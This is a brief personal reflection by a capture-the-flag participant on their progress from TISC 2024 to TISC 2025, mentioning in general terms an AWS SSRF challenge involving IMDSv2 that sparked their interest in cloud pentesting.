Back in TISC 2024, I only completed 1 of 12 challenges which was expected since it was the 2nd CTF I've ever participated in and I only had a basic grasp of Cybersecurity. Now a year later, I managed to make it to the Top 50 placement and completed 8 of 12 challenges, a huge step up from last year.

I learnt so much from this CTF, more specifically, the AWS SSRF Cloud challenge. I wasn't particularly interested in Cloud CTFs right up till I reached this interesting challenge on IMDSv2. It got me interested in Cloud Pentesting and how simple PUT SSRF can be used to gain access into a cloud instance and beyond.

Thanks to the organizers of this year's TISC 2025 and the creators who made it an enjoyable experience!
